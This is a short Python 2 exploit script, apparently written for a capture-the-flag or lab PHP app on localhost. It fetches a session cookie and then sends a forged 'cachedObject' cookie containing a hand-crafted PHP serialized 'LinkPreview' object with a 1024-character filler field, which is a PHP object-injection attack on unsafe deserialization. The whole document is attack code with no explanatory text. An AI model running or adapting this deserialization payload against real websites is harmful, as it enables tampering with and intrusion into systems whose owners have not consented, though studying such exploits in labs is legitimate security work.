import requests
import urllib
import httplib2

http = httplib2.Http()

url = "http://localhost/serialize/index.php"
body = {'link':'http://dr3dd.gitlab.io'}
headers = {'Content-type': 'application/x-www-form-urlencoded'}
response, content = http.request(url, 'POST', headers=headers, body=urllib.urlencode(body))

k = list(urllib.unquote(response['set-cookie']).decode('utf-8')[:-53])
# print(''.join(k))

url = "http://localhost/serialize/viewCache.php"

response['set-cookie'] = """cachedObject=O:11:"LinkPreview":2:{s:17:"LinkPreviewlink";s:22:"http://dr3dd.gitlab.io";s:17:"LinkPreviewdata";s:1024:"%s";}"""%("A"*1024)
headers = {'Content-type': 'application/x-www-form-urlencoded','Cookie': response['set-cookie']}
res, content = http.request(url, 'GET', headers=headers)
print(content)